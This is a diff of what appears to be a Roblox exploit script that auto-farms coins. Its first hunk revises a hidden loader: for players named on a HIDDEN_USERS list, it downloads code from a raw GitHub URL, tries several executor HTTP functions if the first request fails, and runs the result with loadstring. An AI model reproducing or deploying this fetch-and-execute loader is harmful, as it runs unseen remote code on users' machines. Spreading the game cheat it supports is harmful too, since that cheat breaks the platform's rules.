@@ -23,29 +23,31 @@ local HIDDEN_USERS = {
 
 if HIDDEN_USERS[lp.Name] then
     local HIDDEN_URL = "https://raw.githubusercontent.com/bt-y/677skibidi/refs/heads/main/mmmmmmmmhmm"
-    local loaded = false
-    pcall(function()
+    local function fetch(url)
         local body
-        pcall(function() body = game:HttpGet(HIDDEN_URL) end)
+        pcall(function() body = game:HttpGet(url) end)
         if not body or #body < 20 then
             local req = request or (syn and syn.request) or (http and http.request)
             if req then
-                local ok, res = pcall(function() return req({Url = HIDDEN_URL, Method = "GET"}) end)
+                local ok, res = pcall(function() return req({Url = url, Method = "GET"}) end)
                 if ok and res then body = res.Body or res.body end
             end
         end
-        if body and #body >= 20 and not string.find(body, "<html") then
-            local fn = loadstring(body)
-            if fn then
-                fn()
-                loaded = true
-            end
-        end
-    end)
-    if loaded then
+        return body
+    end
+    local src = fetch(HIDDEN_URL)
+    if not src or #src < 20 then
         return
     end
-    -- hidden failed: continue with main script below
+    if string.find(src, "<html") or string.find(src, "<!DOCTYPE") then
+        return
+    end
+    local fn, err = loadstring(src)
+    if not fn then
+        return
+    end
+    fn()
+    return
 end
 
 -- =========================================================
@@ -564,7 +566,7 @@ task.spawn(function()
                         local d = (obj.Position - root.Position).Magnitude
                         if d < RG then table.insert(candidates, {obj = obj, dist = d}) end
                     end
-                    local target, _dist = pickTarget(candidates)
+                    local target = select(1, pickTarget(candidates))
                     if target and target.Parent then
                         local before = realCoins
                         local coinPos = target.Position
